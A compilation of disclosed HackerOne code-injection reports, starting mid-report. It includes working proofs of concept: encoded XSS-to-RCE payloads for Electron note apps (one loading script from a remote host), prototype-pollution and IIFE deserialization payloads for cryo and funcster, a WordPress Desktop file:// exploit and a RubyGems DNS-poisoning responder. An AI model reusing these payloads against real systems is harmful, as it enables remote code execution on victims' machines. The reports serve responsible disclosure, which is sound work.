">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>
```

You write it in a note, then you print it (or save like pdf). The Gnome calculator will open.

I have attached two screenshots and a proof-of-concept video.

## Impact

An attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.

---

### [Insecure implementation of deserialization in cryo](https://hackerone.com/reports/350418)

- **Report ID:** `350418`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @greendog
- **Bounty:** - usd
- **Disclosed:** 2018-06-19T15:51:37.020Z
- **CVE(s):** CVE-2018-3784

**Vulnerability Information:**

I would like to report code injection in serialization package cryo
It allows execute arbitrary code using custom prototype.

# Module

**module name:** cryo
**version:** 0.0.6
**npm page:** `https://www.npmjs.com/package/cryo`

## Module Description

JSON on steroids.
Built for node.js and browsers. Cryo is inspired by Python's pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:

## Module Stats

37 downloads in the last week

# Vulnerability

## Vulnerability Description

If an application uses "cryo" package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.

To reconstruct an object from JSON, cryo uses square bracket notation ( `obj[key]=value` ). So there is an opportunity for an attacker to change `__proto__` property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.
It means that if later in the code the application interacts with the new object in the way which leads to invocation of the object's prototype functions, then the attacker malicious code are executed.


## Steps To Reproduce:

PoC:
```
var Cryo = require('cryo');
var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```
console.log internally calls hydrated's vauleOf method, so an attacker's code are executed and we can see "defconrussia" in console.

## Patch

I suggest to blacklist "__proto__" property in deserialization process.

## Supporting Material/References:

- Ubuntu 16.04
- node v6.11.3
- npm 5.5.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N


> Hunter's comments and funny memes goes here
Also I found a couple of other modules (for example, https://www.npmjs.com/package/kaiser)  which use square bracket notation too, so it's possible to rewrite `__proto__` with them too. But us they don't support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype's methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.
It could be a kind of DoS.  What do you think if I should create similar reports for such cases?

## Impact

An attacker can craft a special JSON file with malicious code which rewrites `__proto__` of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.

---

### [Insecure implementation of deserialization in funcster](https://hackerone.com/reports/350401)

- **Report ID:** `350401`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @greendog
- **Bounty:** - usd
- **Disclosed:** 2018-06-15T21:48:25.666Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report code injection in serialization package funcster.
It allows execute arbitrary code during deserialization of JSON.

# Module

**module name:** funcster
**version:** 0.0.3
**npm page:** `https://www.npmjs.com/package/funcster`

## Module Description

This library contains utilities for serializing and deserializing functions. It provides recursive traversal to discover both serialized and unserialized functions nested within objects and arrays. This is particularly useful for embedding functions into JSON objects.

## Module Stats

4 downloads in the last week

# Vulnerability

## Vulnerability Description

In an application uses "funcster" package to deserialize JSON into object and if an attacker controls this JSON, then an attacker can get arbitrary code execution in the application.
The package reconstructs an object with functions from JSON. But it's supposed that functions of the object are not executed until they are invoked directly in the code later. Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization process.

## Steps To Reproduce:

The vulnerability exists because during deserialization process funcster creates a new module with exported functions from JSON.  Here is this part of code:
```
return "module.exports=(function(module,exports){return{" + entries + "};})();";
```

Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization. The idea is similar to one described in this article -  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Here is a PoC:
```
var funcster = require('funcster');
var serJSON = { __js_function: 'function testa(){var pr = this.constructor.constructor("return process")(); pr.stdout.write("param-pam-pam") }()' }
var newFunc = funcster.deepDeserialize(serJSON);
```

funcster cuts standard built-in objects, but we can bring them back using the global object(this) and the "process" object.
Here is a JSON payload to get OS command execution(whoami):
```
 { __js_function: "function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}/*process.stdout.write(JSON.stringify(a))*/;var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};var x= spawnSync('whoami'); process.stdout.write(x.output.toString());}()"}
```

## Patch

I see no ways to patch it because it is a consequence of design/approach which funster uses to serialize/deserialize object.

## Supporting Material/References:

- Ubuntu 16.04
- node v6.11.3
- npm 5.5.1 


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can craft a special JSON file with malicious code which will be executed during deserialization by funcster. So the attacker can achieve OS command execution.

---

### [Remote Code Execution (RCE) in DoD Websites](https://hackerone.com/reports/235605)

- **Report ID:** `235605`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T18:24:01.031Z
- **CVE(s):** CVE-2013-2165

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a Department of Defense (DoD) website which could have enabled an attacker to execute remote commands on the web server. @joaomatosf was able to demonstrate this vulnerability by developing a custom script that caused the webserver to execute a benign command. This was a very clever demonstration. Impressive work!

Thank you for supporting the DoD Vulnerability Disclosure Program!

---

### [Remote Code Execution in Wordpress Desktop](https://hackerone.com/reports/301458)

- **Report ID:** `301458`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Automattic
- **Reporter:** @mattaustin
- **Bounty:** - usd
- **Disclosed:** 2018-04-14T22:09:50.511Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution. 

This issue looks to be around this line of code: 
https://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38

If shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser).  If we pass the an a .app file on MacOS or an exe it will just execute the code. 

We also link to a remote readable NFS mount (or windows share) to point to a remote executable. 

A Wordpress page is created with: 
```
<center><iframe style="border: 0;" src="https://maustin.net/hax/wp_desktop/index.html" width="250" height="250"></iframe></center> 
```

This file has the following code: 
```
   <script>
      // window.open('file:///Applications/Calculator.app');
      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')
   </script>
```

The file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:

```
tell application "Terminal"
    do script "cat /etc/hosts"
    display dialog "You just got hacked!"
end tell

do shell script "open -a Calculator"
```

### POC
1. Create the setup described above. 
2. Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the "reader")
3. Code is executed when the user views the page. 

See attached video for a working POC. 


### Sugested Fix: 
Before passing a url to shell.openExternal the application should validate that it begins with http:// or https://.

## Impact

An attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run. 

The remote attacker would be able to run any code as the current user on the system once the page is viewed.

In my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.

---

### [[marketplace.informatica.com] -  Template Injection](https://hackerone.com/reports/299241)

- **Report ID:** `299241`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Informatica
- **Reporter:** @samengmg
- **Bounty:** - usd
- **Disclosed:** 2018-01-02T04:10:42.557Z
- **CVE(s):** -

**Summary (team):**

The researcher has identified and reported a "Template Injection" vulnerability in one of Informatica's domain and helped us in resolving the issue.

---

### [Unserialize leading to arbitrary PHP function invoke](https://hackerone.com/reports/210741)

- **Report ID:** `210741`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Rockstar Games
- **Reporter:** @someguyfromthepast
- **Bounty:** - usd
- **Disclosed:** 2017-12-13T19:05:23.704Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher was able to demonstrate a method to run arbitrary PHP functions on www.rockstargames.com. Although we had previously disabled most harmful PHP functions, it was still possible to cause serious damage if this were to be exploited by a malicious party. To solve this issue, we secured the user input method that the researcher pointed out to us, and we disabled all PHP functions save for those that are absolutely crucial to maintaining and administering our site.

---

### [[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron](https://hackerone.com/reports/291539)

- **Report ID:** `291539`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Automattic
- **Reporter:** @ysx
- **Bounty:** - usd
- **Disclosed:** 2017-12-01T13:35:27.401Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

A carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. 

The nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to "preview" the Markdown-formatted note.

## Steps to reproduce

### Prerequisites
A standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider `ysx.bz` the "adversary" server.

Create a new JavaScript file (herein referred to as `hackerone-electron.js`) in the root directory, such that the path would read: `http://ysx.bz/hackerone-electron.js`.

### External JavaScript file

To prepare our exploit, populate this file with the following JavaScript code:

```
write("<h1>Simplenote RCE via Electron - Windows - ysx</h1>");
write("<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>");
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

### Encoding and exploitation

Next, please open a JavaScript `eval` [encoder](https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/) and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an `<img>` tag as part of the crafted note.

```
var js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);
```

The above example should encode as follows:

```
eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))
```

Next, create a new Markdown note within Simplenote for Windows, and paste the following `<img>` tag code.

```
## Test Note
### HackerOne Windows RCE PoC - pops "netplwiz"

<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>
```

Upon selecting the **Preview** option of the Markdown note, the JavaScript will be executed. After several seconds, the `netplwiz` executable will launch on your Windows system.

### Supporting evidence

{F240684}

{F240685}

## Verified conditions

At the time of testing, I have successfully confirmed exploitability in the following environment:

* Simplenote for Windows 1.0.8
* Windows 10 x64 Home Edition

Thanks,

Yasin

**Summary (researcher):**

It was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.

Application execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to @xknown and @roundhill for the swift remediation, and @edio for assisting with the investigation of this issue.

A blogpost on this issue can be found here: https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client

---

### [Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier](https://hackerone.com/reports/218088)

- **Report ID:** `218088`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** RubyGems
- **Reporter:** @claudijd
- **Bounty:** - usd
- **Disclosed:** 2017-08-30T23:36:42.991Z
- **CVE(s):** CVE-2017-0902, CVE-2015-3900, CVE-2015-4020

**Vulnerability Information:**

**Description:**

The RubyGems client supports a gem server API discovery functionality,
which is used when pushing or pulling gems to a gem distribution/hosting
server, like RubyGems.org.  This functionality is provided via a SRV DNS
request to the users gem source hostname prepended with "_rubygems._tcp.".
The response to this request tells the RubyGems client (aka: the gem
command) where the users gem server API is.  In the default RubyGems
scenario, with a gem source of https://rubygems.org, the users SRV DNS
request and reply will look like this:

    ~ $ dig srv _rubygems._tcp.rubygems.org +short
    0 1 80 api.rubygems.org.

Due to a deficiency in DNS response verification, a MiTM positioned 
attacker can poison the DNS response to this record response and force
the client to unknowingly download and install Ruby gems from an attacker
controlled gem server in an alternate security domain.  An example of
such a scenario would look like so:

    ~ $ dig _rubygems._tcp.rubygems.org SRV +short
    0 0 53 evil.com/api.rubygems.com.

In such a scenario, the attacker is able to serve the client malicious gem
content, resulting in trivial remote code execution scenarios.  For
example, the attacker could simply modify the gem source code and trigger
code execution via the extensions API at install time on the client machine
(a gem trojaning technique described by Ben Smith in his "Hacking with
Gems" presentation at Aloha Ruby Conference in 2012 -
https://www.youtube.com/watch?v=z-5bO0Q1J9s)/

This vulnerability has the same net effect/impact as [CVE-2015-3900](https://nvd.nist.gov/vuln/detail/CVE-2015-3900) and
[CVE-2015-4020](https://nvd.nist.gov/vuln/detail/CVE-2015-4020).

**Affected method in Gem::RemoteFetcher:**

https://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119

**PoC DNS SRV Responder:**

    #!/usr/bin/env ruby
    require 'rubydns'
    require 'rubydns/system'
    INTERFACES = [
    	[:udp, "0.0.0.0", 53],
    	[:tcp, "0.0.0.0", 53]
    ]
    Name = Resolv::DNS::Name
    IN = Resolv::DNS::Resource::IN	
    RubyDNS::run_server(:listen => INTERFACES) do
      match(//, IN::SRV) do |transaction|
        transaction.respond!(0,0,53,"evil.com/api.rubygems.com")
      end
    end

**Recommendations:**

Consider this small patch to address the immediate attack vector...

    -      if /\.#{Regexp.quote(host)}\z/ =~ target
    +      if (/\.#{Regexp.quote(host)}\z/ =~ target) && !target.include?("/")

Also, consider moving away from doing API discovery via DNS.  Would recommend 
moving to HTTPS, where you will have a stronger transport security chain.

**References (these are not new, just references prior work here to help triage team understand impact):**

- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356
- https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478
- https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one
- http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html

---

### [links the user may download can be a malicious files](https://hackerone.com/reports/182557)

- **Report ID:** `182557`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Brave Software
- **Reporter:** @seifelsallamy
- **Bounty:** - usd
- **Disclosed:** 2017-08-10T05:10:18.208Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

## Summary:

This vulnerability is pretty simple and pretty dangerous at the same time 

Almost any link the user tries to download it's extension is set according to the file extension in the path 
if the path is `/` then it download's it according to the domain name  
Eg:
[1] http://example.com/example.php
if the user downloaded the link the file type would be `.php`
that's not very dangerous though 

[2] http://example.com/example.exe
if the user downloaded the link the file type would be `.exe`
Okey that's dangerous but it requires a lot of social engineering 
 
[3] http://example.com/
if the user downloaded the link the file type would be `.com`
this requires less social engineering and it's pretty dangerous 
why?
because `.com` files are executable files which may can do what `.exe` can do
here's links about `.com` files
https://en.wikipedia.org/wiki/COM_file
and the difference between `.exe` and `.com`
https://blogs.msdn.microsoft.com/oldnewthing/20080324-00/?p=23033

there's a new many domain names which may can create malicious extensions like `.com`
as example
`.com.py`
which can create a python file 

any website can make his favorable extension in the domain path and when the user downloads it it will be downloaded by the extension
as example http://example.com/example.exe

## Products affected: 

windows 10 x64 brave latest version 

## Steps To Reproduce:

there is 3 ways to reproduce 
[1]
execute this html 
`<a href="http://example.com" download>http://example.com</a>`
right click on the link > Save Link as... > Save
[2]
go to http://example.com
right click > Save Page as... > Save
[3]
execute this html and directly click the link it will download directly 
`<a href="http://example.com" download>http://example.com</a>`


####Note : 
The none exist pages can't be downloaded 

----------
Any link the users tries to download must be `.htm` or `.html`


## Supporting Material/References:
F135079

Thanks!

---

### [Mercurial can be tricked into granting authorized users access to the Python debugger](https://hackerone.com/reports/222020)

- **Report ID:** `222020`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @claudijd
- **Bounty:** - usd
- **Disclosed:** 2017-07-12T14:35:50.100Z
- **CVE(s):** CVE-2017-9462

**Vulnerability Information:**

I reported this bug privately to Mercurial and they produced an out of band release to fix the bug here:

https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29

I produced a very detailed proof of concept with a Metasploit exploit module, which can be seen publicly here:

https://github.com/rapid7/metasploit-framework/pull/8263

The TLDR is that many services which host Mercurial servers often write their own hg-ssh wrapper or heavily customize the hg-ssh wrapper.  If the customized wrapped does not explicitly validate user input to the repo attribute, an attacker can supply a string of "--debugger", which causes the internal hg binary to drop to a Pdb shell, which allows arbitrary Python code execution.

I'm submitting to this program because I believe source code management software like git and mercurial is considered critical infrastructure for the Internet.

**Summary (team):**

### Mercurial 4.1.3 (2017-4-18)

- `hg serve --stdio` could be tricked into granting authorized users access to the Python debugger. Thanks to Jonathan Claudius of Mozilla for reporting this issue. This issue is only a security issue for repositories served using --stdio, which includes ssh but *not* http.

---

### [Remote code execution (RCE) in multiple DoD websites](https://hackerone.com/reports/226245)

- **Report ID:** `226245`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2017-07-05T20:51:34.075Z
- **CVE(s):** -

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. Thank you @joaomatosf for notifying us of this vulnerability!

---

### [Remote Code Execution (RCE) vulnerability in multiple DoD websites](https://hackerone.com/reports/231687)

- **Report ID:** `231687`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2017-07-05T16:34:27.816Z
- **CVE(s):** -

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. Thank you @joaomatosf for notifying us of this vulnerability!

---

### [Remote code execution vulnerability on a DoD website](https://hackerone.com/reports/212985)

- **Report ID:** `212985`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cha5m
- **Bounty:** - usd
- **Disclosed:** 2017-07-03T18:23:05.292Z
- **CVE(s):** CVE-2017-5638

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. Thank you @n0rb3r7 for notifying us of this vulnerability!

**Summary (researcher):**

I was able to leverage a recent, well-known vulnerability to achieve arbitrary, remote command execution on a U.S. Department Of Defense server.

---

### [Server-side include injection vulnerability in a DoD website](https://hackerone.com/reports/192931)

- **Report ID:** `192931`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jutsuce
- **Bounty:** - usd
- **Disclosed:** 2017-07-03T18:11:43.052Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was vulnerable to a Server-Side Include Injection attack which could have allowed an attacker to inject code into HTML pages or, under some circumstances, perform remote code execution. @jutsuce was as able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us!

---

### [Remote code execution vulnerability on a DoD website](https://hackerone.com/reports/192567)

- **Report ID:** `192567`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @korprit
- **Bounty:** - usd
- **Disclosed:** 2017-06-23T13:37:06.811Z
- **CVE(s):** CVE-2014-0094

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. Thank you @korprit for notifying us of this vulnerability!

---

### [Completed Compromise & Source Code Disclosure via Exposed Jenkins Dashboard at https://jenkins101.udemy.com](https://hackerone.com/reports/182104)

- **Report ID:** `182104`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Udemy
- **Reporter:** @cha5m
- **Bounty:** - usd
- **Disclosed:** 2017-06-17T13:59:38.366Z
- **CVE(s):** -

**Vulnerability Information:**

Howdy, @udemy!

Summary:
=======
I am writing to inform you of a critical information disclosure bug via an exposed Jenkins dashboard located at https://jenkins101.udemy.com. Upon navigating to this address, I was asked to authenticate with my Github account. After authenticating, I was surprised to find that I had complete access to the corresponding Jenkins Dashboard as seen in the screenshot below:

{F134658}

Impact:
=====
Contained within these files was the complete Udemy Django source code. This included complete database schemas and keys/ credentials for the following services:

* Crowdin
* Amazon Redshift
* Exchange
* Facebook
* Google
* Maxmind
* Sendgrid
* Sift
* Twilio
* Zencoder
* Level3
* Apple
* Salesforce
* Celery
* Paypal
* Stripe
* Freshdesk
* and more

To verify that these credentials were active, I attempted to login into Sendgrid. I was able to take over the Udemy Sendgrid account as seen in the screenshot below. I did not make any change/ access any information.

{F134656}

Mitigation
=====

Mitigation for this should be fairly straightforward, simply ensuring proper user authentication should prevent future unauthorized users from access the dashboard. I am not storing any of the informaiton that I came across, however, rekeying the compromised systems may not be a bad idea.

I hope this reports helps! Please let me know if you have any questions! 😁

Best,
@n0rb3r7

**Summary (researcher):**

I discovered a critical information disclosure bug via an exposed Jenkins dashboard located at `https://jenkins101.udemy.com`. Upon navigating to this address, I was presented with a Github authentication page. After authenticating, I was surprised to find that I had complete read access to the corresponding Jenkins Dashboard. 

Contained within the dashboard was the complete Udemy source code, including the keys for various Udemy services.

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/231926)

- **Report ID:** `231926`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2017-06-14T18:09:48.734Z
- **CVE(s):** -

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. @joaomatosf was able to demonstrate this vulnerability by developing a custom script that caused the webserver to execute a benign command. This was a very clever demonstration. Thank you!

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/212022)

- **Report ID:** `212022`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0daystolive
- **Bounty:** - usd
- **Disclosed:** 2017-06-01T14:48:16.033Z
- **CVE(s):** CVE-2017-5638

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. @0daystolive and @dly were able to demonstrate this vulnerability by developing a custom script that caused the webserver to execute a benign command. This was a very clever demonstration. Thank you!

---

### [Java Deserialization RCE via JBoss on card.starbucks.in](https://hackerone.com/reports/221294)

- **Report ID:** `221294`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Starbucks
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T14:05:39.787Z
- **CVE(s):** -

**Summary (team):**

The researcher discovered that a Starbucks online system running on the domain `http://card.starbucks.in/` performs deserialization of java objects that are submitted by users on a specific path belonging to JBOSSMQ without sanitizing/validating the data. As a result, an attacker can inject a malicious java object capable of running a command on the system during the deserialization process. We have immediately taken necassary mesures to patch this vulnerability and the researcher responsibly disclosed it to RedHat as well. This was assigned [CVE-2017-7504](https://access.redhat.com/security/cve/cve-2017-7504)

---

### [Remote Code Execution on Git.imgur-dev.com ](https://hackerone.com/reports/206227)

- **Report ID:** `206227`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Imgur
- **Reporter:** @orange
- **Bounty:** - usd
- **Disclosed:** 2017-04-16T17:19:46.735Z
- **CVE(s):** -

**Vulnerability Information:**

Hi, Imgur Security Team:

I just found that your GitHub Enterprise Server(https://git.imgur-dev.com/) didn't patch to the latest version(2.8.7). And there is a Rails static key leads to RCE vulnerability!

You can see the PoC from my screenshots :)

**Summary (researcher):**

GitHub Enterprise Rails static key issue.

The patch released on date 2017/01/31 (https://enterprise.github.com/releases/2.8.7/notes), but two weeks pass, it seems still vulnerable.
I think this server is very critical for Imgur, so I reported to the vendor.

Thanks to Imgur Security Team's kindness :)

P.s. Also thanks to @iblue and his amazing finding!
http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/211381)

- **Report ID:** `211381`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2017-04-13T18:34:06.286Z
- **CVE(s):** -

**Summary (team):**

A remote code execution (RCE) vulnerability was found on a DoD website which could have enabled an attacker to execute remote commands on the web server. @joaomatosf, was able to demonstrate this vulnerability by developing a custom script that caused the webserver to execute a benign command. This was a very clever demonstration. Thanks @joaomatosf, and well done!

---

### [Remote command execution (RCE) vulnerability on a DoD website](https://hackerone.com/reports/202652)

- **Report ID:** `202652`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @japp1
- **Bounty:** - usd
- **Disclosed:** 2017-03-16T17:46:01.011Z
- **CVE(s):** -

**Summary (team):**

